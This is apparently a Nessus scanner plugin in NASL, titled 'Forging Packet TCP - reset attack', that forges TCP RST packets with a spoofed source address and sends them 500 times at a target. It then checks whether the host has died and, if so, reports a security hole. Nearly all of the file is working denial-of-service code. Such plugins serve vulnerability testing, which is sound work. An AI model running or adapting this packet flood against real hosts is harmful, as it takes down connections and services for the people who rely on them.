
if(description)	{
	script_name(english:"Forging Packet TCP - reset attack");
	script_summary(english:"Send TCP RST packet to kill other communication");
	script_category(ACT_KILL_HOST);
	script_copyright(english:"This script was written by Riccardo Melioli");
	exit(0);
}

# Constants
sport = 1234;
dport = 80;
src = get_host_ip();

# Create IP packet
ip = forge_ip_packet(ip_v : 4,
     		 ip_hl : 5,
		     ip_tos : 0,
		     ip_p : IPPROTO_TCP,
		     ip_src : src,
		     ip_ttl : 64);

# Create TCP packet
tcp = forge_tcp_packet(ip: ip,
		       th_sport : sport,
		       th_dport : dport,
			   th_flags : TH_RST
);

# Send TCP packets 500 times
start_denial();
send_packet(tcp) x 500;
alive = end_denial();

if (!alive){
	set_kb_item(name:"Host/dead", value:TRUE);
	security_hole(0);
}